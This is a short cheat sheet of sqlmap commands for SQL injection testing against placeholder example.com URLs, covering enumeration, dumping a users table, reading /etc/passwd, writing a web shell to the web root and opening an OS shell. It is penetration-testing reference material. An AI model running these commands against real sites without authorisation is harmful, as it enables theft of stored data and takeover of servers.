# sqlmap Commands Cheat Sheet

## Basic Usage
```bash
# Basic GET parameter injection testing
sqlmap -u "http://example.com/vulnerable.php?id=1"

# Basic POST parameter injection testing
sqlmap -u "http://example.com/login.php" --data="user=admin&pass=1234"
```

## Enumeration
```bash
# Enumerate databases
sqlmap -u "http://example.com/vulnerable.php?id=1" --dbs

# Enumerate tables in a specific database
sqlmap -u "http://example.com/vulnerable.php?id=1" -D target_db --tables

# Enumerate columns in a specific table
sqlmap -u "http://example.com/vulnerable.php?id=1" -D target_db -T users --columns

# Dump data from a specific table
sqlmap -u "http://example.com/vulnerable.php?id=1" -D target_db -T users --dump
```

## Advanced Options
```bash
# Specify parameter to test
sqlmap -u "http://example.com/vulnerable.php?id=1&cat=2" -p id

# Use a proxy
sqlmap -u "http://example.com/vulnerable.php?id=1" --proxy="http://127.0.0.1:8080"

# Set a random User-Agent
sqlmap -u "http://example.com/vulnerable.php?id=1" --random-agent

# Increase verbosity (1-6)
sqlmap -u "http://example.com/vulnerable.php?id=1" -v 3

# Parse a request file (e.g., from Burp Suite)
sqlmap -r request.txt
```

## Operating System Access
```bash
# Attempt to read a file
sqlmap -u "http://example.com/vulnerable.php?id=1" --file-read="/etc/passwd"

# Attempt to write a file
sqlmap -u "http://example.com/vulnerable.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# Get an OS shell
sqlmap -u "http://example.com/vulnerable.php?id=1" --os-shell
```
